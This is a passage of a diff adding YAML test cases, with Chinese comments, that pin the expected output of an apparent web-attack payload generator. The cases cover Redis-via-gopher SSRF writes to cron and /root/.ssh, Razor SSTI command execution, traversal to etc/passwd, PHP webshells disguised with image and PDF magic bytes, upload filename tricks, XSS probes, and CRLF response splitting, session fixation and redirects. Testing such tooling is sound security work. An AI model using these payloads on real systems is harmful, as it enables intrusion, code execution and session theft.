+      payload: "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/spool/cron/%0D%0A"
+
+  - name: ssrf.generic.scheme.gopher.redis · cmd=dir_ssh
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.gopher.redis
+      slots: {cmd: dir_ssh}
+      outputs: [raw]
+    expect:
+      payload: "gopher://127.0.0.1:6379/_config%20set%20dir%20/root/.ssh/%0D%0A"
+
+  - name: ssrf.generic.scheme.gopher.redis · cmd=filename
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.gopher.redis
+      slots: {cmd: filename}
+      outputs: [raw]
+    expect:
+      # 落点是 crontab 时文件名必须是 root（不带路径），这条就是设它的
+      payload: "gopher://127.0.0.1:6379/_config%20set%20dbfilename%20root%0D%0A"
+
+  - name: ssrf.generic.scheme.gopher.redis · cmd=save
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.gopher.redis
+      slots: {cmd: save}
+      outputs: [raw]
+    expect:
+      # 前两条只是改配置，不 save 不落盘——这条才是真正写文件的那一步
+      payload: "gopher://127.0.0.1:6379/_save%0D%0A"
+
+  # ================= ssti.dotnet.razor.rce · sh =================
+  # Razor 里 Process.Start 的第二个参数是「一整个命令行串」，
+  # 所以 flag 和 cmd 之间那**一个空格**是必须的，且它在 body 里、不在槽位里。
+
+  - name: ssti.dotnet.razor.rce · sh=sh
+    state:
+      vuln: ssti
+      component: razor
+      template: ssti.dotnet.razor.rce
+      slots: {sh: sh}
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      payload: '@{ System.Diagnostics.Process.Start("/bin/sh", "-c whoami"); }'
+
+  - name: ssti.dotnet.razor.rce · sh=cmd
+    state:
+      vuln: ssti
+      component: razor
+      template: ssti.dotnet.razor.rce
+      slots: {sh: cmd}
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      payload: '@{ System.Diagnostics.Process.Start("cmd.exe", "/c whoami"); }'
+
+  # ================= ssti.generic.detect.arith · d =================
+  # 五套定界符，open/close 必须配套。拆成两个独立槽位的后果在这里最直观：
+  # 能拼出 `{{7*7}` 这种两边各自合法、合起来坏掉的串。
+
+  - name: ssti.generic.detect.arith · d=jinja2
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.arith
+      slots: {d: jinja2}
+      outputs: [raw]
+    expect:
+      payload: "{{7*7}}"
+
+  - name: ssti.generic.detect.arith · d=freemarker
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.arith
+      slots: {d: freemarker}
+      outputs: [raw]
+    expect:
+      payload: "${7*7}"
+
+  - name: ssti.generic.detect.arith · d=erb
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.arith
+      slots: {d: erb}
+      outputs: [raw]
+    expect:
+      payload: "<%=7*7%>"
+
+  - name: ssti.generic.detect.arith · d=smarty
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.arith
+      slots: {d: smarty}
+      outputs: [raw]
+    expect:
+      # 单花括号，没有百分号——手写时最容易顺手写成 <%= 或 {{
+      payload: "{7*7}"
+
+  - name: ssti.generic.detect.arith · d=thymeleaf
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.arith
+      slots: {d: thymeleaf}
+      outputs: [raw]
+    expect:
+      # Thymeleaf 预处理需要 __ 前后缀包住 ${ }
+      payload: "__${7*7}__"
+
+  # ================= ssti.generic.detect.str · d =================
+
+  - name: ssti.generic.detect.str · d=jinja2
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.str
+      slots: {d: jinja2}
+      outputs: [raw]
+    expect:
+      payload: "{{7*'7'}}"
+
+  - name: ssti.generic.detect.str · d=freemarker
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.str
+      slots: {d: freemarker}
+      outputs: [raw]
+    expect:
+      # ${} 里是单引号字符串字面量；在 shell 里这条要小心引号配对
+      payload: "${7*'7'}"
+
+  - name: ssti.generic.detect.str · d=erb
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.str
+      slots: {d: erb}
+      outputs: [raw]
+    expect:
+      payload: "<%=7*'7'%>"
+
+  # ================= ssti.generic.detect.config · d =================
+  # 只有两档——这个探测串在 ERB/Smarty 里语义不通，所以那几档没进选项。
+
+  - name: ssti.generic.detect.config · d=jinja2
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.config
+      slots: {d: jinja2}
+      outputs: [raw]
+    expect:
+      payload: "{{config}}"
+
+  - name: ssti.generic.detect.config · d=freemarker
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.config
+      slots: {d: freemarker}
+      outputs: [raw]
+    expect:
+      payload: "${config}"
+
+  # ================= traversal.generic.dotdot.bypass · form =================
+  # 穿越序列的四种变形，seq 字段由 `<<rep(depth,form.seq)>>` 重复 depth 次（默认 3）。
+  # filepath 取相对路径（和已有样本一致），前面不额外加斜杠。
+
+  - name: traversal.generic.dotdot.bypass · form=nested
+    state:
+      vuln: traversal
+      template: traversal.generic.dotdot.bypass
+      slots: {form: nested}
+      vars: {filepath: etc/passwd}
+      outputs: [raw]
+    expect:
+      payload: "....//....//....//etc/passwd"
+
+  - name: traversal.generic.dotdot.bypass · form=dot_slash
+    state:
+      vuln: traversal
+      template: traversal.generic.dotdot.bypass
+      slots: {form: dot_slash}
+      vars: {filepath: etc/passwd}
+      outputs: [raw]
+    expect:
+      # ..;/ 靠 Tomcat 把 ; 后面的当路径参数吃掉才还原成 ../
+      payload: "..;/..;/..;/etc/passwd"
+
+  - name: traversal.generic.dotdot.bypass · form=overlong
+    state:
+      vuln: traversal
+      template: traversal.generic.dotdot.bypass
+      slots: {form: overlong}
+      vars: {filepath: etc/passwd}
+      outputs: [raw]
+    expect:
+      payload: "..%c0%af..%c0%af..%c0%afetc/passwd"
+
+  - name: traversal.generic.dotdot.bypass · form=backslash
+    state:
+      vuln: traversal
+      template: traversal.generic.dotdot.bypass
+      slots: {form: backslash}
+      vars: {filepath: etc/passwd}
+      outputs: [raw]
+    expect:
+      # Windows 分隔符；单引号标量保证反斜杠不被 YAML 吃掉
+      payload: '..\..\..\etc/passwd'
+
+  # ================= upload.generic.filename.traversal · webroot =================
+  # 四个选项是四种部署的**绝对路径去掉前导斜杠**——因为 depth 槽位的值以 `/` 结尾，
+  # 前导斜杠只能有一处，写重了就是 `//var/www/html`。
+  # ext 取默认 .php，name 是变量。
+
+  - name: upload.generic.filename.traversal · webroot=debian
+    state:
+      vuln: upload
+      template: upload.generic.filename.traversal
+      slots: {webroot: debian}
+      vars: {name: shell}
+      outputs: [raw]
+    expect:
+      payload: "/../../../../var/www/html/shell.php"
+
+  - name: upload.generic.filename.traversal · webroot=centos
+    state:
+      vuln: upload
+      template: upload.generic.filename.traversal
+      slots: {webroot: centos}
+      vars: {name: shell}
+      outputs: [raw]
+    expect:
+      # CentOS 的 nginx 根是 /usr/share/nginx/html，不是 /var/www
+      payload: "/../../../../usr/share/nginx/html/shell.php"
+
+  - name: upload.generic.filename.traversal · webroot=alpine
+    state:
+      vuln: upload
+      template: upload.generic.filename.traversal
+      slots: {webroot: alpine}
+      vars: {name: shell}
+      outputs: [raw]
+    expect:
+      payload: "/../../../../var/www/localhost/htdocs/shell.php"
+
+  - name: upload.generic.filename.traversal · webroot=tomcat
+    state:
+      vuln: upload
+      template: upload.generic.filename.traversal
+      slots: {webroot: tomcat}
+      vars: {name: shell}
+      outputs: [raw]
+    expect:
+      # Tomcat 的 Web 根是 webapps/ROOT（大写）
+      payload: "/../../../../usr/local/tomcat/webapps/ROOT/shell.php"
+
+  # ================= upload.generic.content.magic · magic =================
+  # 文件头是**给人眼和检测器看的**，各语言的魔数不能混：
+  # GIF89a / GIF87a / BM / %PDF-1.4 / RIFF....WEBP。
+  # body 里 `<<magic.head>>` 后面紧跟 `<?php`，中间不加任何分隔。
+
+  - name: upload.generic.content.magic · magic=gif
+    state:
+      vuln: upload
+      component: php
+      template: upload.generic.content.magic
+      slots: {magic: gif}
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      payload: "GIF89a<?php system('whoami'); ?>"
+
+  - name: upload.generic.content.magic · magic=gif87
+    state:
+      vuln: upload
+      component: php
+      template: upload.generic.content.magic
+      slots: {magic: gif87}
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      # GIF87a 与 GIF89a 只差最后一字符，是这两个选项唯一能互相区分的地方
+      payload: "GIF87a<?php system('whoami'); ?>"
+
+  - name: upload.generic.content.magic · magic=bmp
+    state:
+      vuln: upload
+      component: php
+      template: upload.generic.content.magic
+      slots: {magic: bmp}
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      payload: "BM<?php system('whoami'); ?>"
+
+  - name: upload.generic.content.magic · magic=pdf
+    state:
+      vuln: upload
+      component: php
+      template: upload.generic.content.magic
+      slots: {magic: pdf}
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      # 以 % 开头 —— YAML 里必须加引号（裸写会被当保留指示符）
+      payload: "%PDF-1.4<?php system('whoami'); ?>"
+
+  - name: upload.generic.content.magic · magic=riff
+    state:
+      vuln: upload
+      component: php
+      template: upload.generic.content.magic
+      slots: {magic: riff}
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      # RIFF 头是 4 字节 'RIFF' + 4 字节长度 + 4 字节 'WEBP'，中间的长度字段用点占位
+      payload: "RIFF....WEBP<?php system('whoami'); ?>"
+
+  # ================= upload.generic.filename.trailing · trick =================
+  # 四种「让 PHP 后缀被处理掉、但检测看到的后缀还是图片」的尾部技巧。
+  # 注意 space 那档**结尾真的有一个空格**，YAML 里必须加引号否则会被吃掉。
+
+  - name: upload.generic.filename.trailing · trick=space
+    state:
+      vuln: upload
+      component: php
+      template: upload.generic.filename.trailing
+      slots: {trick: space}
+      vars: {name: shell}
+      outputs: [raw]
+    expect:
+      payload: "shell.php "
+
+  - name: upload.generic.filename.trailing · trick=dot
+    state:
+      vuln: upload
+      component: php
+      template: upload.generic.filename.trailing
+      slots: {trick: dot}
+      vars: {name: shell}
+      outputs: [raw]
+    expect:
+      # Windows 存盘时去掉结尾的点，落盘就成了 shell.php
+      payload: "shell.php."
+
+  - name: upload.generic.filename.trailing · trick=ads
+    state:
+      vuln: upload
+      component: php
+      template: upload.generic.filename.trailing
+      slots: {trick: ads}
+      vars: {name: shell}
+      outputs: [raw]
+    expect:
+      # NTFS 数据流：::$DATA 后面才是真内容，检测看到的后缀仍是 .php
+      payload: "shell.php::$DATA"
+
+  - name: upload.generic.filename.trailing · trick=pct20
+    state:
+      vuln: upload
+      component: php
+      template: upload.generic.filename.trailing
+      slots: {trick: pct20}
+      vars: {name: shell}
+      outputs: [raw]
+    expect:
+      # %20 是**字面**三个字符，不是空格——到服务端解码才变成空格
+      payload: "shell.php%20"
+
+  # ================= xss.generic.probe.tag · tag =================
+  # head/tail 是一对：不同的标签靠不同的事件属性触发，head 与 tail 必须配套。
+  # js 取默认 alert(1)。
+
+  - name: xss.generic.probe.tag · tag=img
+    state:
+      vuln: xss
+      template: xss.generic.probe.tag
+      slots: {tag: img}
+      outputs: [raw]
+    expect:
+      payload: "<img src=x onerror=alert(1)>"
+
+  - name: xss.generic.probe.tag · tag=svg
+    state:
+      vuln: xss
+      template: xss.generic.probe.tag
+      slots: {tag: svg}
+      outputs: [raw]
+    expect:
+      payload: "<svg onload=alert(1)>"
+
+  - name: xss.generic.probe.tag · tag=body
+    state:
+      vuln: xss
+      template: xss.generic.probe.tag
+      slots: {tag: body}
+      outputs: [raw]
+    expect:
+      payload: "<body onload=alert(1)>"
+
+  - name: xss.generic.probe.tag · tag=input
+    state:
+      vuln: xss
+      template: xss.generic.probe.tag
+      slots: {tag: input}
+      outputs: [raw]
+    expect:
+      # autofocus 是必须的——没有它 onfocus 不会自己触发
+      payload: "<input autofocus onfocus=alert(1)>"
+
+  - name: xss.generic.probe.tag · tag=details
+    state:
+      vuln: xss
+      template: xss.generic.probe.tag
+      slots: {tag: details}
+      outputs: [raw]
+    expect:
+      # open 同理：details 不展开就不会触发 ontoggle
+      payload: "<details open ontoggle=alert(1)>"
+
+  - name: xss.generic.probe.tag · tag=source
+    state:
+      vuln: xss
+      template: xss.generic.probe.tag
+      slots: {tag: source}
+      outputs: [raw]
+    expect:
+      # head 自带开标签 <video>，所以闭合角括号只有一个（在 tail 里）；
+      # src=x 是必须的——没有它 source 就没有会加载失败的资源，onerror 未必触发
+      payload: "<video><source src=x onerror=alert(1)>"
+
+  # ================= xss.generic.probe.slash · tag =================
+  # 斜杠写法：head / event / tail 三截，body 在 head 和 event 之间插一个 `/`。
+  # 这条路径最容易出现「event 字段与 head 里的事件名对不上」——比如 img 配了 onload。
+
+  - name: xss.generic.probe.slash · tag=svg
+    state:
+      vuln: xss
+      template: xss.generic.probe.slash
+      slots: {tag: svg}
+      outputs: [raw]
+    expect:
+      payload: "<svg/onload=alert(1)>"
+
+  - name: xss.generic.probe.slash · tag=body
+    state:
+      vuln: xss
+      template: xss.generic.probe.slash
+      slots: {tag: body}
+      outputs: [raw]
+    expect:
+      payload: "<body/onload=alert(1)>"
+
+  - name: xss.generic.probe.slash · tag=img
+    state:
+      vuln: xss
+      template: xss.generic.probe.slash
+      slots: {tag: img}
+      outputs: [raw]
+    expect:
+      # img 没有 onload，事件必须是 onerror，且 src=x 在 head 里
+      payload: "<img src=x/onerror=alert(1)>"
+
+  - name: xss.generic.probe.slash · tag=details
+    state:
+      vuln: xss
+      template: xss.generic.probe.slash
+      slots: {tag: details}
+      outputs: [raw]
+    expect:
+      # head 是 `<details open`（没有 onload），事件名槽位里是 ontoggle
+      payload: "<details open/ontoggle=alert(1)>"
+
+  # ================= xss.generic.break.tag · ctx =================
+  # 四个选项是「先闭合哪个标签」。闭合标签与实际所处的上下文必须一致，
+  # 选错了就是一条不执行的载荷——而它看起来完全正常。
+
+  - name: xss.generic.break.tag · ctx=script
+    state:
+      vuln: xss
+      template: xss.generic.break.tag
+      slots: {ctx: script}
+      outputs: [raw]
+    expect:
+      payload: "</script><script>alert(1)</script>"
+
+  - name: xss.generic.break.tag · ctx=textarea
+    state:
+      vuln: xss
+      template: xss.generic.break.tag
+      slots: {ctx: textarea}
+      outputs: [raw]
+    expect:
+      payload: "</textarea><script>alert(1)</script>"
+
+  - name: xss.generic.break.tag · ctx=title
+    state:
+      vuln: xss
+      template: xss.generic.break.tag
+      slots: {ctx: title}
+      outputs: [raw]
+    expect:
+      payload: "</title><script>alert(1)</script>"
+
+  - name: xss.generic.break.tag · ctx=style
+    state:
+      vuln: xss
+      template: xss.generic.break.tag
+      slots: {ctx: style}
+      outputs: [raw]
+    expect:
+      payload: "</style><script>alert(1)</script>"
+
+  # ================= xss.generic.entity.encode · enc =================
+  # 三档是同一个 `<` 的三种实体写法。十六进制要带 x、十进制不带、
+  # 命名实体带分号——这几处手写时最常漏。
+
+  - name: xss.generic.entity.encode · enc=hex
+    state:
+      vuln: xss
+      template: xss.generic.entity.encode
+      slots: {enc: hex}
+      outputs: [raw]
+    expect:
+      # 小写 x3c / x3e；分号不能少，少了浏览器不认
+      payload: "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"
+
+  - name: xss.generic.entity.encode · enc=dec
+    state:
+      vuln: xss
+      template: xss.generic.entity.encode
+      slots: {enc: dec}
+      outputs: [raw]
+    expect:
+      # 十进制 60/62，没有 x
+      payload: "&#60;script&#62;alert(1)&#60;/script&#62;"
+
+  - name: xss.generic.entity.encode · enc=named
+    state:
+      vuln: xss
+      template: xss.generic.entity.encode
+      slots: {enc: named}
+      outputs: [raw]
+    expect:
+      # &lt; &gt; 收尾的字母 l 和 t 不能写反
+      payload: "&lt;script&gt;alert(1)&lt;/script&gt;"
+
+  # ================= xss.generic.dom.fragment · tag =================
+  # body 以 `#` 开头——意图是整段塞进 URL 的 fragment 里（DOM 型）。
+  # 注意 `#` 在 YAML 里是注释起点，期望值必须加引号。
+
+  - name: xss.generic.dom.fragment · tag=img
+    state:
+      vuln: xss
+      template: xss.generic.dom.fragment
+      slots: {tag: img}
+      outputs: [raw]
+    expect:
+      payload: "#<img src=x onerror=alert(1)>"
+
+  - name: xss.generic.dom.fragment · tag=svg
+    state:
+      vuln: xss
+      template: xss.generic.dom.fragment
+      slots: {tag: svg}
+      outputs: [raw]
+    expect:
+      payload: "#<svg onload=alert(1)>"
+
+  - name: xss.generic.dom.fragment · tag=details
+    state:
+      vuln: xss
+      template: xss.generic.dom.fragment
+      slots: {tag: details}
+      outputs: [raw]
+    expect:
+      payload: "#<details open ontoggle=alert(1)>"
+
+  # =====================================================================
+  # 以下两组（crlf / cors）是在本文件开始写之后才进 data/ 的槽位，
+  # 一并补上——漏一个选项就是漏一个静默损坏的入口。
+  # =====================================================================
+
+  # ================= crlf.* · nl =================
+  # 11 条 crlf 模板共用同一个 nl 槽位：seq 是「换行怎么表示」的五档。
+  # 五档的差别全在**换行的字节**上，而它们在终端里长得一模一样——
+  # 这是最典型的「打错一个字符也不会有测试红」的地方，所以逐档钉死。
+  #   crlf → %0d%0a（明细文的百分号编码）  lf → %0a  cr → %0d
+  #   raw  → 真正的 CR LF 两个字节        dbl → %250d%250a（双重编码）
+  # raw 那档的期望值必须用双引号标量写 `\r\n`：YAML 里的转义才是真 CR/LF，
+  # 而别处那几档里的 `%0d%0a` 是**十一个普通字符**，两者不能混。
+
+  # ---- crlf.generic.probe.header ----
+
+  - name: crlf.generic.probe.header · nl=crlf
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.header
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      payload: "%0d%0aX-Crlf-Probe:%20injected"
+
+  - name: crlf.generic.probe.header · nl=lf
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.header
+      slots: {nl: lf}
+      outputs: [raw]
+    expect:
+      payload: "%0aX-Crlf-Probe:%20injected"
+
+  - name: crlf.generic.probe.header · nl=cr
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.header
+      slots: {nl: cr}
+      outputs: [raw]
+    expect:
+      # 只有 CR，没有 LF——部分实现把裸 CR 也当行结束
+      payload: "%0dX-Crlf-Probe:%20injected"
+
+  - name: crlf.generic.probe.header · nl=raw
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.header
+      slots: {nl: raw}
+      outputs: [raw]
+    expect:
+      # 真的 CR LF 两个字节，不是百分号编码 —— 期望值里 \r\n 是 YAML 转义
+      payload: "\r\nX-Crlf-Probe:%20injected"
+
+  - name: crlf.generic.probe.header · nl=dbl
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.header
+      slots: {nl: dbl}
+      outputs: [raw]
+    expect:
+      # %25 是 % 本身的双重编码，解码一次后才是 %0d%0a
+      payload: "%250d%250aX-Crlf-Probe:%20injected"
+
+  # ---- crlf.generic.probe.bare ----
+
+  - name: crlf.generic.probe.bare · nl=crlf
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.bare
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      payload: "%0d%0a"
+
+  - name: crlf.generic.probe.bare · nl=lf
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.bare
+      slots: {nl: lf}
+      outputs: [raw]
+    expect:
+      payload: "%0a"
+
+  - name: crlf.generic.probe.bare · nl=cr
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.bare
+      slots: {nl: cr}
+      outputs: [raw]
+    expect:
+      payload: "%0d"
+
+  - name: crlf.generic.probe.bare · nl=raw
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.bare
+      slots: {nl: raw}
+      outputs: [raw]
+    expect:
+      # body 就是 `<<nl.seq>>`，载荷只有那两个字节
+      payload: "\r\n"
+
+  - name: crlf.generic.probe.bare · nl=dbl
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.bare
+      slots: {nl: dbl}
+      outputs: [raw]
+    expect:
+      payload: "%250d%250a"
+
+  # ---- crlf.generic.probe.folded ----
+
+  - name: crlf.generic.probe.folded · nl=crlf
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.folded
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      payload: "%0d%0a%20X-Crlf-Probe:%201"
+
+  - name: crlf.generic.probe.folded · nl=lf
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.folded
+      slots: {nl: lf}
+      outputs: [raw]
+    expect:
+      payload: "%0a%20X-Crlf-Probe:%201"
+
+  - name: crlf.generic.probe.folded · nl=cr
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.folded
+      slots: {nl: cr}
+      outputs: [raw]
+    expect:
+      payload: "%0d%20X-Crlf-Probe:%201"
+
+  - name: crlf.generic.probe.folded · nl=raw
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.folded
+      slots: {nl: raw}
+      outputs: [raw]
+    expect:
+      # 换行后紧跟的那个 %20 是续行标记：让新头被当成上一头的续行
+      payload: "\r\n%20X-Crlf-Probe:%201"
+
+  - name: crlf.generic.probe.folded · nl=dbl
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.folded
+      slots: {nl: dbl}
+      outputs: [raw]
+    expect:
+      payload: "%250d%250a%20X-Crlf-Probe:%201"
+
+  # ---- crlf.generic.body.split.html ----
+  # body 里 `<<nl.seq>>` 出现**两次**：一次结束当前头，一次制造空行，
+  # 空行之后才是新响应体（HTTP 里头和体就是这么分的）。
+
+  - name: crlf.generic.body.split.html · nl=crlf
+    state:
+      vuln: crlf
+      template: crlf.generic.body.split.html
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      payload: "%0d%0a%0d%0a<html><body><script>alert(document.domain)</script></body></html>"
+
+  - name: crlf.generic.body.split.html · nl=lf
+    state:
+      vuln: crlf
+      template: crlf.generic.body.split.html
+      slots: {nl: lf}
+      outputs: [raw]
+    expect:
+      payload: "%0a%0a<html><body><script>alert(document.domain)</script></body></html>"
+
+  - name: crlf.generic.body.split.html · nl=cr
+    state:
+      vuln: crlf
+      template: crlf.generic.body.split.html
+      slots: {nl: cr}
+      outputs: [raw]
+    expect:
+      payload: "%0d%0d<html><body><script>alert(document.domain)</script></body></html>"
+
+  - name: crlf.generic.body.split.html · nl=raw
+    state:
+      vuln: crlf
+      template: crlf.generic.body.split.html
+      slots: {nl: raw}
+      outputs: [raw]
+    expect:
+      # 两处都展开成真 CRLF —— 也就是「头结束 + 空行」四个字节
+      payload: "\r\n\r\n<html><body><script>alert(document.domain)</script></body></html>"
+
+  - name: crlf.generic.body.split.html · nl=dbl
+    state:
+      vuln: crlf
+      template: crlf.generic.body.split.html
+      slots: {nl: dbl}
+      outputs: [raw]
+    expect:
+      payload: "%250d%250a%250d%250a<html><body><script>alert(document.domain)</script></body></html>"
+
+  # ---- crlf.generic.body.split.marker ----
+
+  - name: crlf.generic.body.split.marker · nl=crlf
+    state:
+      vuln: crlf
+      template: crlf.generic.body.split.marker
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      payload: "%0d%0a%0d%0acrlf-split-marker"
+
+  - name: crlf.generic.body.split.marker · nl=lf
+    state:
+      vuln: crlf
+      template: crlf.generic.body.split.marker
+      slots: {nl: lf}
+      outputs: [raw]
+    expect:
+      payload: "%0a%0acrlf-split-marker"
+
+  - name: crlf.generic.body.split.marker · nl=cr
+    state:
+      vuln: crlf
+      template: crlf.generic.body.split.marker
+      slots: {nl: cr}
+      outputs: [raw]
+    expect:
+      payload: "%0d%0dcrlf-split-marker"
+
+  - name: crlf.generic.body.split.marker · nl=raw
+    state:
+      vuln: crlf
+      template: crlf.generic.body.split.marker
+      slots: {nl: raw}
+      outputs: [raw]
+    expect:
+      payload: "\r\n\r\ncrlf-split-marker"
+
+  - name: crlf.generic.body.split.marker · nl=dbl
+    state:
+      vuln: crlf
+      template: crlf.generic.body.split.marker
+      slots: {nl: dbl}
+      outputs: [raw]
+    expect:
+      payload: "%250d%250a%250d%250acrlf-split-marker"
+
+  # ---- crlf.generic.cookie.set ----
+  # sid 是变量、Slot 只提供换行；`;%20Path=/` 里的分号是 Set-Cookie 语法的一部分。
+
+  - name: crlf.generic.cookie.set · nl=crlf
+    state:
+      vuln: crlf
+      template: crlf.generic.cookie.set
+      slots: {nl: crlf}
+      vars: {sid: abc123}
+      outputs: [raw]
+    expect:
+      payload: "%0d%0aSet-Cookie:%20sessionid=abc123;%20Path=/"
+
+  - name: crlf.generic.cookie.set · nl=lf
+    state:
+      vuln: crlf
+      template: crlf.generic.cookie.set
+      slots: {nl: lf}
+      vars: {sid: abc123}
+      outputs: [raw]
+    expect:
+      payload: "%0aSet-Cookie:%20sessionid=abc123;%20Path=/"
+
+  - name: crlf.generic.cookie.set · nl=cr
+    state:
+      vuln: crlf
+      template: crlf.generic.cookie.set
+      slots: {nl: cr}
+      vars: {sid: abc123}
+      outputs: [raw]
+    expect:
+      payload: "%0dSet-Cookie:%20sessionid=abc123;%20Path=/"
+
+  - name: crlf.generic.cookie.set · nl=raw
+    state:
+      vuln: crlf
+      template: crlf.generic.cookie.set
+      slots: {nl: raw}
+      vars: {sid: abc123}
+      outputs: [raw]
+    expect:
+      payload: "\r\nSet-Cookie:%20sessionid=abc123;%20Path=/"
+
+  - name: crlf.generic.cookie.set · nl=dbl
+    state:
+      vuln: crlf
+      template: crlf.generic.cookie.set
+      slots: {nl: dbl}
+      vars: {sid: abc123}
+      outputs: [raw]
+    expect:
+      payload: "%250d%250aSet-Cookie:%20sessionid=abc123;%20Path=/"
+
+  # ---- crlf.generic.header.content_type ----
+
+  - name: crlf.generic.header.content_type · nl=crlf
+    state:
+      vuln: crlf
+      template: crlf.generic.header.content_type
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      payload: "%0d%0aContent-Type:%20text/html;%20charset=utf-8"
+
+  - name: crlf.generic.header.content_type · nl=lf
+    state:
+      vuln: crlf
+      template: crlf.generic.header.content_type
+      slots: {nl: lf}
+      outputs: [raw]
+    expect:
+      payload: "%0aContent-Type:%20text/html;%20charset=utf-8"
+
+  - name: crlf.generic.header.content_type · nl=cr
+    state:
+      vuln: crlf
+      template: crlf.generic.header.content_type
+      slots: {nl: cr}
+      outputs: [raw]
+    expect:
+      payload: "%0dContent-Type:%20text/html;%20charset=utf-8"
+
+  - name: crlf.generic.header.content_type · nl=raw
+    state:
+      vuln: crlf
+      template: crlf.generic.header.content_type
+      slots: {nl: raw}
+      outputs: [raw]
+    expect:
+      payload: "\r\nContent-Type:%20text/html;%20charset=utf-8"
+
+  - name: crlf.generic.header.content_type · nl=dbl
+    state:
+      vuln: crlf
+      template: crlf.generic.header.content_type
+      slots: {nl: dbl}
+      outputs: [raw]
+    expect:
+      payload: "%250d%250aContent-Type:%20text/html;%20charset=utf-8"
+
+  # ---- crlf.generic.header.refresh ----
+  # scheme 槽位取默认 https，evil 是模板声明的变量。
+
+  - name: crlf.generic.header.refresh · nl=crlf
+    state:
+      vuln: crlf
+      template: crlf.generic.header.refresh
+      slots: {nl: crlf}
+      vars: {evil: evil.example.com}
+      outputs: [raw]
+    expect:
+      payload: "%0d%0aRefresh:%200;url=https://evil.example.com/"
+
+  - name: crlf.generic.header.refresh · nl=lf
+    state:
+      vuln: crlf
+      template: crlf.generic.header.refresh
+      slots: {nl: lf}
+      vars: {evil: evil.example.com}
+      outputs: [raw]
+    expect:
+      payload: "%0aRefresh:%200;url=https://evil.example.com/"
+
+  - name: crlf.generic.header.refresh · nl=cr
+    state:
+      vuln: crlf
+      template: crlf.generic.header.refresh
+      slots: {nl: cr}
+      vars: {evil: evil.example.com}
+      outputs: [raw]
+    expect:
+      payload: "%0dRefresh:%200;url=https://evil.example.com/"
+
+  - name: crlf.generic.header.refresh · nl=raw
+    state:
+      vuln: crlf
+      template: crlf.generic.header.refresh
+      slots: {nl: raw}
+      vars: {evil: evil.example.com}
+      outputs: [raw]
+    expect:
+      payload: "\r\nRefresh:%200;url=https://evil.example.com/"
+
+  - name: crlf.generic.header.refresh · nl=dbl
+    state:
+      vuln: crlf
+      template: crlf.generic.header.refresh
+      slots: {nl: dbl}
+      vars: {evil: evil.example.com}
+      outputs: [raw]
+    expect:
+      payload: "%250d%250aRefresh:%200;url=https://evil.example.com/"
+
+  # ---- crlf.generic.header.content_length ----
+  # size 槽位取默认 0（这个头的作用是让响应队列错位，值本身要显眼地不匹配）。
+
+  - name: crlf.generic.header.content_length · nl=crlf
+    state:
+      vuln: crlf
+      template: crlf.generic.header.content_length
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      payload: "%0d%0aContent-Length:%200"
+
+  - name: crlf.generic.header.content_length · nl=lf
+    state:
+      vuln: crlf
+      template: crlf.generic.header.content_length
+      slots: {nl: lf}
+      outputs: [raw]
+    expect:
+      payload: "%0aContent-Length:%200"
+
+  - name: crlf.generic.header.content_length · nl=cr
+    state:
+      vuln: crlf
+      template: crlf.generic.header.content_length
+      slots: {nl: cr}
+      outputs: [raw]
+    expect:
+      payload: "%0dContent-Length:%200"
+
+  - name: crlf.generic.header.content_length · nl=raw
+    state:
+      vuln: crlf
+      template: crlf.generic.header.content_length
+      slots: {nl: raw}
+      outputs: [raw]
+    expect:
+      payload: "\r\nContent-Length:%200"
+
+  - name: crlf.generic.header.content_length · nl=dbl
+    state:
+      vuln: crlf
+      template: crlf.generic.header.content_length
+      slots: {nl: dbl}
+      outputs: [raw]
+    expect:
+      payload: "%250d%250aContent-Length:%200"
+
+  # ---- crlf.generic.header.transfer_encoding ----
+
+  - name: crlf.generic.header.transfer_encoding · nl=crlf
+    state:
+      vuln: crlf
+      template: crlf.generic.header.transfer_encoding
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      payload: "%0d%0aTransfer-Encoding:%20chunked"
+
+  - name: crlf.generic.header.transfer_encoding · nl=lf
+    state:
+      vuln: crlf
+      template: crlf.generic.header.transfer_encoding
+      slots: {nl: lf}
